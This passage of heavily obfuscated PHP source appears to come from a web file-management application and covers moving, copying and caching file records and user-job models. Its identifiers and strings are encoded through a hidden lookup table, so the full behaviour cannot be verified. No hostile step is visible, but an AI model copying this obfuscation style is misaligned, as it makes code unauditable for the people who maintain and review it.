$¿öï¡»Ï[91]) { $this->_childrenListAll($¾ÏèĞÄ, $í¦æÆ); } } } private function sourceInfoCache($ÉÀèúş¦) { if (isset($this->_childrenItemCache[$ÉÀèúş¦])) { return $this->_childrenItemCache[$ÉÀèúş¦]; } return $this->sourceInfo($ÉÀèúş¦); } private function _childrenList($œ¾šÔçº) { if (isset($this->_childrenListCache[$œ¾šÔçº])) { return $this->_childrenListCache[$œ¾šÔçº]; } return $this->_childrenListSelect($œ¾šÔçº); } private function _childrenListSelect($îÆùôü¿) { $é¤óÄü÷ =& $_SERVER[£ğ°ÖØø]; $Ûí€ˆŞã = array($é¤óÄü÷[192] => $îÆùôü¿, $é¤óÄü÷[514] => $this->targetIsDelete); $¡€¤ïœ = $this->where($Ûí€ˆŞã)->select(); $¡€¤ïœ = $¡€¤ïœ ? $¡€¤ïœ : array(); $³¼êÑ¦ø = array_to_keyvalue($¡€¤ïœ, $é¤óÄü÷[193]); $this->_childrenListCache[$îÆùôü¿] = $³¼êÑ¦ø; foreach ($³¼êÑ¦ø as $îÆùôü¿ => $ÆŒß´) { $this->_childrenItemCache[$îÆùôü¿] = $ÆŒß´; } return $³¼êÑ¦ø; } private function fileNameExistAuto($·ÙØÊøò, $«ª‰éˆâ) { $¤£éÛôš =& $_SERVER[£ğ°ÖØø]; if ($«ª‰éˆâ[$¤£éÛôš[514]] == $¤£éÛôš[91]) { return $this->fileNameExist($·ÙØÊøò, $«ª‰éˆâ[$¤£éÛôš[32]]); } return $this->fileNameExistCache($·ÙØÊøò, $«ª‰éˆâ[$¤£éÛôš[32]]); } private function fileNameExistCache($‡µ·ŞŒ³, $ı‚©®¤û) { $µ–Â×ƒÑ =& $_SERVER[£ğ°ÖØø]; $ı‚©®¤û = strtolower($ı‚©®¤û); $­¹¼Ö¥ª = $this->_childrenList($‡µ·ŞŒ³); foreach ($­¹¼Ö¥ª as $ŠÂÄşÑ) { if ($ı‚©®¤û == strtolower($ŠÂÄşÑ[$µ–Â×ƒÑ[32]])) { return $ŠÂÄşÑ[$µ–Â×ƒÑ[193]]; } } return !1; } private function fileNameAutoCache($§•è€Ôü, $–ú¶÷ˆˆ, $³ÈØûä, $“€¡Ñ™ë) { $®‰‘ ± =& $_SERVER[£ğ°ÖØø]; $ÃÒş§Ãñ = $this->_childrenList($§•è€Ôü); $ïÇª®ª× = array_to_keyvalue($ÃÒş§Ãñ, $®‰‘ ±[12], $®‰‘ ±[32]); return $this->fileNameAutoGet($ïÇª®ª×, $–ú¶÷ˆˆ, $³ÈØûä, $“€¡Ñ™ë); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($ı“±Ä¹Ğ, $âñèâ€ï, $Ì»şŠôÖ = REPEAT_REPLACE, $üâÔ¢È = '') { $“¡¾í‰ =& $_SERVER[£ğ°ÖØø]; $³‡’ÕÊ = $this->sourceInfo($ı“±Ä¹Ğ); $’Ë²´Ô‘ = $this->sourceInfo($âñèâ€ï); if ($³‡’ÕÊ[$“¡¾í‰[192]] == $’Ë²´Ô‘[$“¡¾í‰[193]]) { if ($³‡’ÕÊ[$“¡¾í‰[514]] == $“¡¾í‰[91]) { Model($“¡¾í‰[512])->restore(array($ı“±Ä¹Ğ)); } if (!$üâÔ¢È || $üâÔ¢È == $³‡’ÕÊ[$“¡¾í‰[32]]) { return $ı“±Ä¹Ğ; } } $—”‘¯›Ê = $this->pathInfoMore($ı“±Ä¹Ğ); if ($this->isParentOf($ı“±Ä¹Ğ, $âñèâ€ï)) { return !1; } if (!$³‡’ÕÊ || !$’Ë²´Ô‘ || $’Ë²´Ô‘[$“¡¾í‰[494]] != $“¡¾í‰[91]) { return !1; } Hook::trigger($“¡¾í‰[667], $—”‘¯›Ê); $this->targetIsDelete = intval($³‡’ÕÊ[$“¡¾í‰[514]]); if ($³‡’ÕÊ[$“¡¾í‰[192]] == $âñèâ€ï && $üâÔ¢È != $³‡’ÕÊ[$“¡¾í‰[32]]) { $ ¨¾€ = $this->fileNameExist($âñèâ€ï, $üâÔ¢È); if ($ ¨¾€ && $³‡’ÕÊ[$“¡¾í‰[494]] == $“¡¾í‰[228]) { $•ÀŠşÓğ = $this->sourceInfo($ ¨¾€); $Ü¤ßË¾ó = $this->fileHistory($•ÀŠşÓğ, $³‡’ÕÊ[$“¡¾í‰[550]], $³‡’ÕÊ[$“¡¾í‰[79]]); if (!$Ü¤ßË¾ó) { Model($“¡¾í‰[553])->remove($³‡’ÕÊ[$“¡¾í‰[550]]); } $this->removeNow($ı“±Ä¹Ğ, !1); $this->folderSizeReset($âñèâ€ï); Hook::trigger($“¡¾í‰[668], $—”‘¯›Ê); return $ ¨¾€; } } $ñóé£Ò = $üâÔ¢È ? $üâÔ¢È : $³‡’ÕÊ[$“¡¾í‰[32]]; $this->lockMoveStart($ı“±Ä¹Ğ); $this->lockWriteStart($âñèâ€ï, $ñóé£Ò); $™ŞØÒÃÚ = array($“¡¾í‰[638] => array(), $“¡¾í‰[669] => !1); $this->clearShare($ı“±Ä¹Ğ, $âñèâ€ï); $ø°ÛÙ• = $this->fileNameExistAuto($âñèâ€ï, $³‡’ÕÊ); $ŸÂí¸ã = $this->_move($ı“±Ä¹Ğ, $âñèâ€ï, $Ì»şŠôÖ, $™ŞØÒÃÚ, $üâÔ¢È); $this->sourceCacheClear(); if ($³‡’ÕÊ[$“¡¾í‰[494]] == $“¡¾í‰[91] && $ø°ÛÙ•) { $this->folderSizeResetChildren($ŸÂí¸ã); } Model($“¡¾í‰[230])->linkAdd($™ŞØÒÃÚ[$“¡¾í‰[638]]); if ($ø°ÛÙ• && $™ŞØÒÃÚ[$“¡¾í‰[669]]) { $this->removeNow($ı“±Ä¹Ğ, !1); } $this->lockMoveEnd($ı“±Ä¹Ğ); $this->lockWriteEnd($âñèâ€ï, $ñóé£Ò); $this->folderSizeReset($³‡’ÕÊ[$“¡¾í‰[192]]); $this->folderSizeReset($âñèâ€ï); $€¶ìïÒœ = array($³‡’ÕÊ[$“¡¾í‰[192]], $âñèâ€ï); if ($³‡’ÕÊ[$“¡¾í‰[494]] == $“¡¾í‰[91]) { $€¶ìïÒœ[] = $ı“±Ä¹Ğ; } $this->updateModifyTime($€¶ìïÒœ); Model($“¡¾í‰[642])->eventMove($ı“±Ä¹Ğ, $³‡’ÕÊ[$“¡¾í‰[192]], $âñèâ€ï); Hook::trigger($“¡¾í‰[668], $—”‘¯›Ê); return $ŸÂí¸ã; } private function _move($‹¿åÓ„ , $ğş¨¤Ê¦, $ìÇÌí‡, &$“®Â©íÙ, $Ï¡úã¦ = '') { $ÚƒÄ”ÅÏ =& $_SERVER[£ğ°ÖØø]; $ä­Ã¨ºØ = $this->sourceInfo($‹¿åÓ„ ); $éºµˆÓÚ = $ä­Ã¨ºØ[$ÚƒÄ”ÅÏ[494]] == $ÚƒÄ”ÅÏ[91]; $«çÒÍ» = $Ï¡úã¦ ? $Ï¡úã¦ : $ä­Ã¨ºØ[$ÚƒÄ”ÅÏ[32]]; $Ûêˆ™é = $this->fileNameExistAuto($ğş¨¤Ê¦, $ä­Ã¨ºØ); $this->lockMoveStart($‹¿åÓ„ ); $this->lockWriteStart($ğş¨¤Ê¦, $«çÒÍ»); if (!$Ûêˆ™é) { return $this->_moveForce($‹¿åÓ„ , $ğş¨¤Ê¦, $«çÒÍ»); } $£¦Â …â = $Ûêˆ™é; $—ş´üˆ– = !1; if ($éºµˆÓÚ) { if ($ìÇÌí‡ == REPEAT_RENAME_FOLDER) { $«çÒÍ» = $this->fileNameAuto($ğş¨¤Ê¦, $«çÒÍ», $ìÇÌí‡, $éºµˆÓÚ); $£¦Â …â = $this->_moveForce($‹¿åÓ„ , $ğş¨¤Ê¦, $«çÒÍ»); } else { if ($ìÇÌí‡ == REPEAT_RENAME_FOLDER) { $ìÇÌí‡ = REPEAT_RENAME; } $İùáÛí² = $this->_childrenListSelect($‹¿åÓ„ ); foreach ($İùáÛí² as $—áµ¢˜†) { $this->_move($—áµ¢˜†[$ÚƒÄ”ÅÏ[193]], $Ûêˆ™é, $ìÇÌí‡, $“®Â©íÙ); } $—ş´üˆ– = !0; } } else { if ($ìÇÌí‡ == REPEAT_SKIP) { $—ş´üˆ– = !0; } else { if ($ìÇÌí‡ == REPEAT_RENAME || $ìÇÌí‡ == REPEAT_RENAME_FOLDER) { $«çÒÍ» = $this->fileNameAuto($ğş¨¤Ê¦, $«çÒÍ», $ìÇÌí‡, $éºµˆÓÚ); $£¦Â …â = $this->_moveForce($‹¿åÓ„ , $ğş¨¤Ê¦, $«çÒÍ»); } else { if ($ìÇÌí‡ == REPEAT_REPLACE) { $¶Şİƒ»ª = $this->sourceInfoCache($Ûêˆ™é); $ê„÷èÚ = $this->fileHistory($¶Şİƒ»ª, $ä­Ã¨ºØ[$ÚƒÄ”ÅÏ[550]], $ä­Ã¨ºØ[$ÚƒÄ”ÅÏ[79]]); $—ş´üˆ– = !0; if ($ê„÷èÚ) { $“®Â©íÙ[$ÚƒÄ”ÅÏ[638]][] = $ä­Ã¨ºØ[$ÚƒÄ”ÅÏ[550]]; } } } } } if ($—ş´üˆ– && !$“®Â©íÙ[$ÚƒÄ”ÅÏ[669]]) { $“®Â©íÙ[$ÚƒÄ”ÅÏ[669]] = !0; } return $£¦Â …â; } private function _moveForce($Ú¸òã©, $Ã¥ã¯ğŠ, $£¹ú¶ªÔ) { $¸³³ï”ï =& $_SERVER[£ğ°ÖØø]; $êåò‰ç… = $this->sourceInfo($Ú¸òã©); $¹¬¤ÅñÔ = $this->sourceInfo($Ã¥ã¯ğŠ); $˜­‹İÕ¹ = $êåò‰ç…[$¸³³ï”ï[494]] == $¸³³ï”ï[91]; $Êµ©¹Ü– = array($¸³³ï”ï[486] => $¹¬¤ÅñÔ[$¸³³ï”ï[193]], $¸³³ï”ï[661] => $¹¬¤ÅñÔ[$¸³³ï”ï[593]] . $¹¬¤ÅñÔ[$¸³³ï”ï[193]] . $¸³³ï”ï[50], $¸³³ï”ï[657] => $¹¬¤ÅñÔ[$¸³³ï”ï[190]], $¸³³ï”ï[658] => $¹¬¤ÅñÔ[$¸³³ï”ï[578]], $¸³³ï”ï[660] => USER_ID, $¸³³ï”ï[503] => $£¹ú¶ªÔ); $»–Ïêë° = $êåò‰ç…[$¸³³ï”ï[190]] == SourceModel::TYPE_GROUP && $¹¬¤ÅñÔ[$¸³³ï”ï[190]] == SourceModel::TYPE_GROUP && $êåò‰ç…[$¸³³ï”ï[578]] == $¹¬¤ÅñÔ[$¸³³ï”ï[578]]; if (!$»–Ïêë° && $this->moveClearAuth) { Model($¸³³ï”ï[576])->authClear($Ú¸òã©); } $’À¦¶¨¿ = $êåò‰ç…[$¸³³ï”ï[514]] == $¸³³ï”ï[91] && $¹¬¤ÅñÔ[$¸³³ï”ï[514]] != $¸³³ï”ï[91]; if ($’À¦¶¨¿) { $Êµ©¹Ü–[$¸³³ï”ï[513]] = 0; } if ($˜­‹İÕ¹) { $Êµ„÷– = array($¸³³ï”ï[661] => array($¸³³ï”ï[621], $êåò‰ç…[$¸³³ï”ï[593]] . $êåò‰ç…[$¸³³ï”ï[193]] . $¸³³ï”ï[622])); $Ó´›ííí = $êåò‰ç…[$¸³³ï”ï[593]] . $êåò‰ç…[$¸³³ï”ï[193]] . $¸³³ï”ï[50]; $¡áùæØ = $¹¬¤ÅñÔ[$¸³³ï”ï[593]] . $¹¬¤ÅñÔ[$¸³³ï”ï[193]] . $¸³³ï”ï[50] . $êåò‰ç…[$¸³³ï”ï[193]] . $¸³³ï”ï[50]; $Øøø¢ŒÑ = array($¸³³ï”ï[661] => array($¸³³ï”ï[670], "\x72\145\160\x6c\x61\143\x65\50\160\141\162\x65\x6e\x74\x4c\145\166\x65\154\x2c\47{$Ó´›ííí}\x27\x2c\x27{$¡áùæØ}\47\x29"), $¸³³ï”ï[657] => $¹¬¤ÅñÔ[$¸³³ï”ï[190]], $¸³³ï”ï[658] => $¹¬¤ÅñÔ[$¸³³ï”ï[578]]); if ($’À¦¶¨¿) { $Øøø¢ŒÑ[$¸³³ï”ï[513]] = 0; } $this->where($Êµ„÷–)->data($Øøø¢ŒÑ)->save(); } $this->where(array($¸³³ï”ï[500] => $Ú¸òã©))->data($Êµ©¹Ü–)->save(); return $Ú¸òã©; } private function clearShare($ºæÃ¦ÆÚ, $…äÒ­ø³) { $ìáü—èî =& $_SERVER[£ğ°ÖØø]; $õ÷×û­³ = $this->sourceInfo($ºæÃ¦ÆÚ); $³ä¹šÊÚ = $this->sourceInfo($…äÒ­ø³); if ($õ÷×û­³[$ìáü—èî[578]] == $³ä¹šÊÚ[$ìáü—èî[578]] && $õ÷×û­³[$ìáü—èî[190]] == $ìáü—èî[671]) { return; } $’Ë‡ß¨ = array($ìáü—èî[593] => array($ìáü—èî[621], $õ÷×û­³[$ìáü—èî[593]] . $ºæÃ¦ÆÚ . $ìáü—èî[622])); $¶‘Ïİœ = $this->field($ìáü—èî[500])->where($’Ë‡ß¨)->getField($ìáü—èî[193], !0); if (!$¶‘Ïİœ) { return; } $’Ë‡ß¨ = array($ìáü—èî[193] => array($ìáü—èî[7], $¶‘Ïİœ), $ìáü—èî[672] => 1); $ô»®ùè¸ = Model($ìáü—èî[673])->field($ìáü—èî[674])->where($’Ë‡ß¨)->select(); if (!$ô»®ùè¸) { return; } $ô»®ùè¸ = array_to_keyvalue($ô»®ùè¸, $ìáü—èî[12], $ìáü—èî[674]); $’Ë‡ß¨ = array($ìáü—èî[674] => array($ìáü—èî[7], $ô»®ùè¸)); Model($ìáü—èî[673])->where($’Ë‡ß¨)->save(array($ìáü—èî[672] => 0)); Model($ìáü—èî[675])->where($’Ë‡ß¨)->delete(); } public function copyFolderFromIO($áÌòàî†, $ğÛçßàŠ, $‚øë¢ìÍ, $ã–ÊÜæ, $Â›Ç›Ùâ, $öªÖğÏ˜ = false) { $‹¶«¨‘ =& $_SERVER[£ğ°ÖØø]; $†ˆÇÍÅš = array($‹¶«¨‘[639] => array(), $‹¶«¨‘[640] => array(), $‹¶«¨‘[638] => array(), $‹¶«¨‘[676] => array()); $’‘ø£ïŒ = $öªÖğÏ˜ ? $öªÖğÏ˜ : $áÌòàî†->pathThis($ğÛçßàŠ); $ÀÎ°“ğ’ = $this->fileNameExist($‚øë¢ìÍ, $’‘ø£ïŒ); $ëêÆÆéò = $this->mkdir($‚øë¢ìÍ, $’‘ø£ïŒ, $ã–ÊÜæ); if (!$ÀÎ°“ğ’ || $ã–ÊÜæ == REPEAT_RENAME_FOLDER) { $ã–ÊÜæ = !1; } if ($ÀÎ°“ğ’) { $this->_childrenAllMake($ÀÎ°“ğ’); } Hook::trigger($‹¶«¨‘[677]); $this->_copyChildTo($áÌòàî†, $ğÛçßàŠ, $ëêÆÆéò, $ã–ÊÜæ, $†ˆÇÍÅš, $Â›Ç›Ùâ); Hook::trigger($‹¶«¨‘[678]); if ($ëêÆÆéò) { $this->folderSizeResetChildren($ëêÆÆéò); } $this->_childrenListClear(); Model($‹¶«¨‘[641])->addAll($†ˆÇÍÅš[$‹¶«¨‘[639]], array(), !0); Model($‹¶«¨‘[642])->eventCopy($ëêÆÆéò); $this->saveAll($†ˆÇÍÅš[$‹¶«¨‘[640]]); Model($‹¶«¨‘[553])->linkAdd($†ˆÇÍÅš[$‹¶«¨‘[638]]); Model($‹¶«¨‘[553])->remove($†ˆÇÍÅš[$‹¶«¨‘[676]]); $this->folderSizeReset($‚øë¢ìÍ); $this->updateModifyTime($‚øë¢ìÍ); return $ëêÆÆéò; } private function _copyChildTo($ˆÅÃğÄÛ, $ëöÂœ…¶, $óº›Şğô, $ÖÍÅ·®, &$«ƒºè”ğ, $‚Ø”š£) { $‚‡œ¦Ë =& $_SERVER[£ğ°ÖØø]; $ß»¸¥–Ù = $this->sourceInfoCache($óº›Şğô); $ ùêç†— = $ˆÅÃğÄÛ->listPath($ëöÂœ…¶); $ ùêç†— = $ ùêç†— ? $ ùêç†— : array($‚‡œ¦Ë[86] => array(), $‚‡œ¦Ë[85] => array()); $§³šÉ€¸ = array_merge($ ùêç†—[$‚‡œ¦Ë[86]], $ ùêç†—[$‚‡œ¦Ë[85]]); $ş®‰Æ²ì = $this->_addFiles($ˆÅÃğÄÛ, $ ùêç†—[$‚‡œ¦Ë[86]], $‚Ø”š£); $›´Ó­’İ = array(); foreach ($§³šÉ€¸ as &$í˜Š…É›) { if (isset($ş®‰Æ²ì[$í˜Š…É›[$‚‡œ¦Ë[32]]])) { $í˜Š…É› = $ş®‰Æ²ì[$í˜Š…É›[$‚‡œ¦Ë[32]]]; } $í˜Š…É›[$‚‡œ¦Ë[494]] = $í˜Š…É›[$‚‡œ¦Ë[33]] == $‚‡œ¦Ë[78]; $í˜Š…É›[$‚‡œ¦Ë[495]] = substr(_get($í˜Š…É›, $‚‡œ¦Ë[169], $‚‡œ¦Ë[12]), 0, 10); $í˜Š…É›[$‚‡œ¦Ë[79]] = _get($í˜Š…É›, $‚‡œ¦Ë[79], 0); $í˜Š…É›[$‚‡œ¦Ë[550]] = _get($í˜Š…É›, $‚‡œ¦Ë[550], 0); if (!isset($í˜Š…É›[$‚‡œ¦Ë[679]]) && $í˜Š…É›[$‚‡œ¦Ë[550]]) { $«ƒºè”ğ[$‚‡œ¦Ë[676]][] = $í˜Š…É›[$‚‡œ¦Ë[550]]; } if ($ÖÍÅ·®) { $Á¬¤Ó±Ü = $this->fileNameExistCache($óº›Şğô, $í˜Š…É›[$‚‡œ¦Ë[32]]); if ($Á¬¤Ó±Ü) { if ($í˜Š…É›[$‚‡œ¦Ë[494]] || $ÖÍÅ·® == REPEAT_SKIP) { continue; } if ($ÖÍÅ·® == REPEAT_REPLACE) { $¶´òÊİÜ = $this->sourceInfoCache($Á¬¤Ó±Ü); $Äö²âÜ = $this->fileHistory($¶´òÊİÜ, $í˜Š…É›[$‚‡œ¦Ë[550]], $í˜Š…É›[$‚‡œ¦Ë[79]]); if ($Äö²âÜ) { $«ƒºè”ğ[$‚‡œ¦Ë[638]][] = $í˜Š…É›[$‚‡œ¦Ë[550]]; } continue; } else { if ($ÖÍÅ·® == REPEAT_RENAME) { $í˜Š…É›[$‚‡œ¦Ë[32]] = $this->fileNameAutoCache($óº›Şğô, $í˜Š…É›[$‚‡œ¦Ë[32]], $ÖÍÅ·®, !1); } } } } if (!$í˜Š…É›[$‚‡œ¦Ë[494]] && $í˜Š…É›[$‚‡œ¦Ë[550]] == 0) { continue; } if (!$í˜Š…É›[$‚‡œ¦Ë[494]] && $í˜Š…É›[$‚‡œ¦Ë[550]]) { $«ƒºè”ğ[$‚‡œ¦Ë[638]][] = $í˜Š…É›[$‚‡œ¦Ë[550]]; } $›´Ó­’İ[] = $this->_makeItemData($í˜Š…É›, $ß»¸¥–Ù, $í˜Š…É›[$‚‡œ¦Ë[32]]); } unset($í˜Š…É›); if (!empty($›´Ó­’İ)) { $this->addAll($›´Ó­’İ); $this->_childrenListSelect($óº›Şğô); } $ßÍçÛ‚ü = $this->_childrenList($óº›Şğô); $ßÍçÛ‚ü = array_to_keyvalue($ßÍçÛ‚ü, $‚‡œ¦Ë[32]); foreach ($§³šÉ€¸ as $í˜Š…É›) { $¶´òÊİÜ = $ßÍçÛ‚ü[$í˜Š…É›[$‚‡œ¦Ë[32]]]; $Ş‹µœä = $¶´òÊİÜ[$‚‡œ¦Ë[193]]; $this->_copyApplyMeta($¶´òÊİÜ, $«ƒºè”ğ); if ($í˜Š…É›[$‚‡œ¦Ë[33]] == $‚‡œ¦Ë[78]) { $í˜Š…É›[$‚‡œ¦Ë[87]] = $ˆÅÃğÄÛ->getPathInner($í˜Š…É›[$‚‡œ¦Ë[87]]); $this->_copyChildTo($ˆÅÃğÄÛ, $í˜Š…É›[$‚‡œ¦Ë[87]], $Ş‹µœä, $ÖÍÅ·®, $«ƒºè”ğ, $‚Ø”š£); } } } private function _addFiles($³¤Í•ºƒ, $µû·˜Ü, $…¨Ÿó™Ğ) { $ª‘Š‚×¶ =& $_SERVER[£ğ°ÖØø]; if (!$µû·˜Ü || count($µû·˜Ü) == 0) { return array(); } $Âá €ŠÇ = array(); foreach ($µû·˜Ü as &$—ë±©çâ) { Hook::trigger($ª‘Š‚×¶[680], $—ë±©çâ); $—ë±©çâ[$ª‘Š‚×¶[87]] = $³¤Í•ºƒ->getPathInner($—ë±©çâ[$ª‘Š‚×¶[87]]); $±ä¨Ù¸Ø = $³¤Í•ºƒ->hashSimple($—ë±©çâ[$ª‘Š‚×¶[87]]); $ÑŠ˜Ù = $³¤Í•ºƒ->hashMd5($—ë±©çâ[$ª‘Š‚×¶[87]]); if (strlen($ÑŠ˜Ù) > 10 && !isset($Âá €ŠÇ[$ÑŠ˜Ù])) { $Âá €ŠÇ[$ÑŠ˜Ù] = array(); } $—ë±©çâ[$ª‘Š‚×¶[681]] = $±ä¨Ù¸Ø; $—ë±©çâ[$ª‘Š‚×¶[556]] = $ÑŠ˜Ù; $Âá €ŠÇ[$ÑŠ˜Ù][] =& $—ë±©çâ; if (count($Âá €ŠÇ[$ÑŠ˜Ù]) > 1) { $—ë±©çâ[$ª‘Š‚×¶[679]] = !0; } Hook::trigger($ª‘Š‚×¶[682], $—ë±©çâ); } unset($—ë±©çâ); $Ò—º¢Ö = array($ª‘Š‚×¶[556] => array($ª‘Š‚×¶[7], array_keys($Âá €ŠÇ))); $ğúŞíŸ = Model($ª‘Š‚×¶[683]); $Ææ€éàÆ = $ğúŞíŸ->where($Ò—º¢Ö)->select(); $Ææ€éàÆ = $Ææ€éàÆ ? $Ææ€éàÆ : array(); foreach ($Ææ€éàÆ as $äƒÅ‡üæ) { if (!isset($Âá €ŠÇ[$äƒÅ‡üæ[$ª‘Š‚×¶[556]]])) { continue; } $¤ÏüÅ¬ = $Âá €ŠÇ[$äƒÅ‡üæ[$ª‘Š‚×¶[556]]]; foreach ($¤ÏüÅ¬ as &$—ë±©çâ) { $—ë±©çâ[$ª‘Š‚×¶[550]] = $äƒÅ‡üæ[$ª‘Š‚×¶[550]]; $—ë±©çâ[$ª‘Š‚×¶[679]] = !0; } unset($—ë±©çâ); } $ÜÂ—µ³ = array(); foreach ($µû·˜Ü as $øøÌåòÉ) { Hook::trigger($ª‘Š‚×¶[684], $øøÌåòÉ); if (isset($øøÌåòÉ[$ª‘Š‚×¶[679]]) && $øøÌåòÉ[$ª‘Š‚×¶[679]]) { Hook::trigger($ª‘Š‚×¶[685], $øøÌåòÉ); continue; } $ÓÅ¦À‹ = $³¤Í•ºƒ->getPathInner($øøÌåòÉ[$ª‘Š‚×¶[87]]); $Ò­¼Ã‚ = $ğúŞíŸ->addFileMake($ÓÅ¦À‹, $øøÌåòÉ[$ª‘Š‚×¶[79]], $øøÌåòÉ[$ª‘Š‚×¶[681]], $øøÌåòÉ[$ª‘Š‚×¶[556]], $øøÌåòÉ[$ª‘Š‚×¶[32]], $…¨Ÿó™Ğ); Hook::trigger($ª‘Š‚×¶[685], $øøÌåòÉ); if (!is_array($Ò­¼Ã‚)) { continue; } $ÜÂ—µ³[] = $Ò­¼Ã‚; } $ğúŞíŸ->addAll($ÜÂ—µ³); $Ò—º¢Ö = array($ª‘Š‚×¶[556] => array($ª‘Š‚×¶[7], array_keys($Âá €ŠÇ))); $Ææ€éàÆ = $ğúŞíŸ->where($Ò—º¢Ö)->select(); $Ææ€éàÆ = $Ææ€éàÆ ? $Ææ€éàÆ : array(); foreach ($Ææ€éàÆ as $äƒÅ‡üæ) { if (!isset($Âá €ŠÇ[$äƒÅ‡üæ[$ª‘Š‚×¶[556]]])) { continue; } $ˆ–Ç¿í =& $Âá €ŠÇ[$äƒÅ‡üæ[$ª‘Š‚×¶[556]]]; foreach ($ˆ–Ç¿í as &$—ë±©çâ) { $—ë±©çâ[$ª‘Š‚×¶[550]] = $äƒÅ‡üæ[$ª‘Š‚×¶[550]]; } unset($—ë±©çâ); } $´¸º˜­½ = array(); foreach ($µû·˜Ü as $ò­ùœÒ©) { $´¸º˜­½[$ò­ùœÒ©[$ª‘Š‚×¶[32]]] = $ò­ùœÒ©; } return $´¸º˜­½; } } define($_SERVER[£ğ°ÖØø][686], $_SERVER[£ğ°ÖØø][687]); $qnxgefzslk = $_SERVER[£ğ°ÖØø][688]; goto Aœµ®…Üß; DÌ‹µ±¨¥…: class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\152\x6f\x62\114\151\x73\164"; public $field = array("\156\141\x6d\145", "\144\x65\x73\143", "\x73\x6f\x72\x74"); const JOB_KEY = "\163\145\x6c\x66\112\x6f\x62\x4c\x69\x73\x74"; public function listData($ÍÁš ¨ = false, $¿ñí§ú¦ = "\x73\157\x72\x74", $µñ–ÛÎË = false) { return parent::listData($ÍÁš ¨, $¿ñí§ú¦, $µñ–ÛÎË); } public function remove($åÇÔªÀ) { return parent::remove($åÇÔªÀ); } public function add($é™ÊîÖ) { $´×ˆ˜½¸ =& $_SERVER[£ğ°ÖØø]; if ($this->findByName($é™ÊîÖ[$´×ˆ˜½¸[32]])) { return !1; } $é™ÊîÖ[$´×ˆ˜½¸[1978]] = $this->getSort(); return parent::insert($é™ÊîÖ); } private function getSort() { $–ıç€ÆŠ =& $_SERVER[£ğ°ÖØø]; $ğØÌ±… = parent::listData(); $ØÒÜ¦Ï = array_to_keyvalue($ğØÌ±…, $–ıç€ÆŠ[12], $–ıç€ÆŠ[1978]); return empty($ØÒÜ¦Ï) ? 0 : max($ØÒÜ¦Ï) + 1; } public function update($Õ»›µÁ, $½¿ÒêÆÖ) { $ãˆÀĞ²ç =& $_SERVER[£ğ°ÖØø]; $ƒşØ“Ì = parent::listData($Õ»›µÁ); $ğş¨Öáş = $this->findByName($½¿ÒêÆÖ[$ãˆÀĞ²ç[32]]); if (!$ƒşØ“Ì || $ğş¨Öáş && $ğş¨Öáş[$ãˆÀĞ²ç[484]] != $ƒşØ“Ì[$ãˆÀĞ²ç[484]]) { return !1; } return parent::update($Õ»›µÁ, $½¿ÒêÆÖ); } public function setUserJob($©Ë£Ê¬Œ, $¬äÊü…Ö) { $ºø”¯¥Æ =& $_SERVER[£ğ°ÖØø]; if (!is_array($¬äÊü…Ö)) { $¬äÊü…Ö = array($¬äÊü…Ö); } $È®–ó’ = parent::listData(); $ó¼µ îŠ = array_to_keyvalue($È®–ó’, $ºø”¯¥Æ[32]); $¸«İ·áì = $ºø”¯¥Æ[463]; foreach ($¬äÊü…Ö as $éİÆ—Ñ¾) { if ($ó¼µ îŠ[$éİÆ—Ñ¾]) { $¸«İ·áì .= $ó¼µ îŠ[$éİÆ—Ñ¾][$ºø”¯¥Æ[484]] . $ºø”¯¥Æ[50]; } else { $ÖÏß·ø” = $this->add($éİÆ—Ñ¾); $¸«İ·áì .= $ÖÏß·ø” . $ºø”¯¥Æ[50]; } } $¸«İ·áì = rtrim($¸«İ·áì, $ºø”¯¥Æ[50]); Model($ºø”¯¥Æ[607])->metaSet($©Ë£Ê¬Œ, self::JOB_KEY, $¸«İ·áì); } public function getUserJob($Ìî¡‚Š‡) { $Æ¤ÑçÙ² = Model($_SERVER[£ğ°ÖØø][607])->metaGet($Ìî¡‚Š‡); return $this->getUserJobInfo($Æ¤ÑçÙ²[self::JOB_KEY]); } public function getUserJobInfo($—…ª¸€) { $ßîâÅ’Æ =& $_SERVER[£ğ°ÖØø]; $æÌÁ · = explode($ßîâÅ’Æ[50], $—…ª¸€); $õ²Á©‘“ = parent::listData(); $õ²Á©‘“ = array_remove_key($õ²Á©‘“, $ßîâÅ’Æ[231]); $í †Òøş = array(); foreach ($æÌÁ · as $ø²ë‚å) { if (isset($õ²Á©‘“[$ø²ë‚å])) { $í †Òøş[] = $õ²Á©‘“[$ø²ë‚å]; } } return $í †Òøş; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\162"; protected $tableMeta = array("\164\x61\x62\154\x65\116\x61\155\145" => "\165\163\145\x72\137\x6d\145\x74\141", "\x6d\x65\164\141\x46\151\x65\x6c\144" => "\165\163\145\162\x49\x44"); protected $simpleField = "\165\163\145\x72\x49\104\x2c\x6e\x69\x63\x6b\116\141\155\145\54\156\x61\x6d\145\54\141\166\141\x74\141\162\x2c\x73\145\x78\54\x73\x74\141\x74\x75\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($îÜ‹™“«) { $é¶ÇÏò =& $_SERVER[£ğ°ÖØø]; $ô§÷ş…€ = $é¶ÇÏò[2433]; return array($é¶ÇÏò[2036] => array($îÜ‹™“«[0], $ô§÷ş…€), $é¶ÇÏò[2038] => array($îÜ‹™“«[0], $ô§÷ş…€), $é¶ÇÏò[2434] => array($îÜ‹™“«[0], $ô§÷ş…€)); } protected function getInfo($×å½ÖÖŞ, $„İ ÜÏĞ = false) { $¾ÖÖëì = $this->getInfoSimple($×å½ÖÖŞ); if (!is_array($¾ÖÖëì)) { return array(); } if ($„İ ÜÏĞ) { return $this->_getInfoApply($¾ÖÖëì); } return $this->cacheFunctionGet($_SERVER[£ğ°ÖØø][2040], $×å½ÖÖŞ); } protected function getInfoFull($§“Š›ØÈ, $¹á¹Üøü = false) { $¾˜•ÀÇ› = $this->getInfoSimple($§“Š›ØÈ); if (!is_array($¾˜•ÀÇ›)) { return array(); } if ($¹á¹Üøü) { return $this->_getInfoApply($¾˜•ÀÇ›, !0); } return 